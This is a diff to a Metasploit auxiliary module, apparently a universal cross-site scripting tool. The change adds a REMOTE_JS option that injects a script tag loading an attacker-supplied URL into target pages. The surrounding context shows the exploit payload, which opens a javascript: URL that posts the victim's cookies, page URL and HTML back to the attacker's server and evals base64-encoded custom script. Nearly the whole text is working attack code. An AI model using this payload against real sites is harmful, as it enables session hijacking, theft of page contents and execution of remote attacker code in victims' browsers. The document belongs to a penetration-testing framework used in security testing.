@@ -57,6 +57,11 @@ class Metasploit3 < Msf::Auxiliary
         "A string of javascript to execute in the context of the target URLs.",
         ''
       ]),
+      OptString.new('REMOTE_JS', [
+        false,
+        "A URL to inject into a script tag in the context of the target URLs.",
+        ''
+      ]),
       OptBool.new('BYPASS_XFO', [
         false,
         "Bypass URLs that have X-Frame-Options by using a one-click popup exploit.",
@@ -123,7 +128,7 @@ class Metasploit3 < Msf::Auxiliary
           var exploit = function(){
             window.open('\\u0000javascript:if(document&&document.body){(opener||top).postMessage('+
               'JSON.stringify({cookie:document.cookie,url:location.href,body:document.body.innerH'+
-              'TML,i:'+(i||0)+'}),"*");eval(atob("#{Rex::Text.encode_base64(datastore['CUSTOM_JS'])}"'+
+              'TML,i:'+(i||0)+'}),"*");eval(atob("#{Rex::Text.encode_base64(custom_js)}"'+
               '));}void(0);', n);
           }
           if (!n) {
@@ -213,6 +218,19 @@ class Metasploit3 < Msf::Auxiliary
     myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
     port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
     "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch"
+  end
+
+  def custom_js
+    rjs_hook + datastore['CUSTOM_JS']
+  end
+
+  def rjs_hook
+    remote_js = datastore['REMOTE_JS']
+    if remote_js.present?
+      "var s = document.createElement('script');s.setAttribute('src', '#{remote_js}');document.body.appendChild(s); "
+    else
+      ''
+    end
   end
 
   def run
